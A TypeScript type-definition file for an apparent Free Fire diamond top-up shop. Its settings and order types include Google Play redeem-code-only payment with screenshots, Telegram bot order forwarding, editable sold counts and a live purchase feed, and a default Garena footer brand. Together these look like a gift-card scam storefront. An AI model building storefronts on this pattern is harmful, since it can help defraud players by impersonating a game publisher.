export interface Product {
  id: string;
  name: string;
  originalPrice: number;
  discountPrice: number;
  image: string;
  badge: string;
  status: 'available' | 'sold_out' | 'hidden';
  categoryId: string;
  is_best_seller?: boolean;
  is_hot_deal?: boolean;
  pin_to_top?: boolean;
  tag_text?: string;
  glow_animation?: boolean;
  pulse_animation?: boolean;
  priority?: number;
}

export interface Category {
  id: string;
  name: string;
  status: 'active' | 'hidden';
}

export interface Announcement {
  text: string;
  enabled: boolean;
}

export interface LiveFeedEntry {
  id: string;
  uid: string;
  packageName: string;
  timestamp: string;
}

export interface ApiSettings {
  apiUrl: string;
  apiKey: string;
  apiType: string;
  fieldNickname: string;
  fieldUid: string;
  fieldVerified: string;
  enabled: boolean;
}

export interface TelegramSettings {
  botToken: string;
  chatId: string;
  enabled: boolean;
}

export interface WebsiteSettings {
  websiteName: string;
  logoUrl: string;
  deliveryNotice: string;
  supportTelegram: string;
  supportEmail: string;
  supportWhatsapp?: string;
  
  // Dashboard Customization
  tagline?: string;              // tagline below logo e.g. "Cheap Diamond Topup"
  
  // Custom Trust indicators
  trustText1?: string;           // "⚡ Fast"
  trustText2?: string;           // "🛡 Secure"
  trustText3?: string;           // "🎧 Support"
  
  // Featured Game Card details
  featuredGameImage?: string;    // Game card image (Free Fire logo/icon)
  featuredGameBgImage?: string;   // Separate card background image
  featuredGameName?: string;     // "FREE FIRE"
  featuredGameRating?: string;   // "5.0"
  featuredGameSold?: string;     // "12k+ Sold"
  featuredGameDiscount?: string; // "3-10% OFF"
  featuredGameSubtext?: string;  // "Instant UID Delivery • safe & authorized top-up"

  // Browse products title
  browseTitle?: string;          // "Packages & Membership"
  
  // Real-time customization & theme colors
  colorBrandYellow?: string;     // Primary theme action coloring e.g. "#fbbc04" or "#f59e0b"
  colorBrandYellowHover?: string;// Hover state
  colorHeaderBg?: string;        // Navbar bg e.g. "#ffffff"
  colorHeaderText?: string;      // Brand text e.g. "#0f172a"
  colorTaglineText?: string;     // Tagline text e.g. "#f59e0b"
  colorCardText?: string;        // Product text e.g. "#1e293b"
  colorWebsiteBg?: string;       // Custom main website background color
  colorAnnouncementBg?: string;  // Custom announcement bar background
  colorAnnouncementText?: string;// Custom announcement bar text
  colorProductCardBg?: string;   // Custom product card wrapper background
  colorLiveFeedBg?: string;      // Custom Live Purchase frame background
  colorBuyNowBtn?: string;       // Custom Buy/Submit buttons backgroundColor
  colorBuyNowText?: string;      // Custom Buy/Submit text color
  colorNavBg?: string;           // Custom bottom/side navigations background
  colorNavText?: string;         // Custom normal navigation link text color
  colorNavActive?: string;       // Custom active navigation highlight indicator color
  showProfileTab?: boolean;      // Toggle Profile sidebar/navigation tab visibility (default true)

  // 1. Taskbar/Navigation Customization
  navDashboardLabel?: string;    // Label for home/dashboard e.g. "Store"
  navProductsLabel?: string;     // Label for products catalog e.g. "Diamonds"
  navProfileLabel?: string;      // Label for profile tab e.g. "Support"

  // 2. Profile Page Customization
  profileHeading?: string;       // Custom label for profile header e.g. "User Dashboard"
  profileBalanceText?: string;   // Custom account description or currency info e.g. "Anonymous client session • Secure SSL"
  profileNoticeText?: string;    // Custom bottom footer notice text/disclaimer e.g. "No Register Policy Notice"
  profileNoticeBody?: string;    // Custom body description for policy notice e.g. "Epic Game Shop never stores permanent records..."

  // 3. UID Verification Page Customization
  uidPageTitle?: string;         // e.g. "Player ID Checker"
  uidPageSubtitle?: string;      // e.g. "Verify character nickname before completing payments."
  uidPlaceholderText?: string;   // e.g. "Enter Free Fire UID (e.g. 2521746277)"
  uidVerifyBtnLabel?: string;    // e.g. "Verify Player Nickname"

  // 4. Payment Page Customization
  paymentNoticeEn?: string;      // e.g. "Payment accepted via redeem code only..."
  paymentNoticeHi?: string;      // e.g. "पेमेंट केवल रिडीम कोड से ही स्वीकार..."
  paymentTitleText?: string;     // e.g. "Redemption Submission"
  paymentSubtext?: string;       // e.g. "Please enter your pre-purchased Google Play Redeem Code..."
  paymentPlaceholder?: string;   // e.g. "ABCD-EFGH-IJKL-MNOP"
  paymentSubmitLabel?: string;    // e.g. "Submit Order"

  // 5. Success Page Customization
  successHeadline?: string;      // e.g. "Payment Submission Received!"
  successSubtext?: string;       // e.g. "Your Free Fire diamonds topup order is under review..."

  // 6. Admin Credentials Customization
  adminUsername?: string;
  adminPassword?: string;

  // Footer custom brand logo
  footerLogoUrl?: string;        // Custom footer logo image (replaces default Garena SVG)
  footerLogoText?: string;       // Custom footer brand text (defaults to "Garena")
  footerLogoColor?: string;      // Custom footer logo color (defaults to "#FF1F25")
}

export interface OrderState {
  selectedProduct: Product | null;
  uid: string;
  playerName: string;
  verified: boolean;
  redeemCode: string;
  screenshot: string | null; // Base64 or Object URL
}
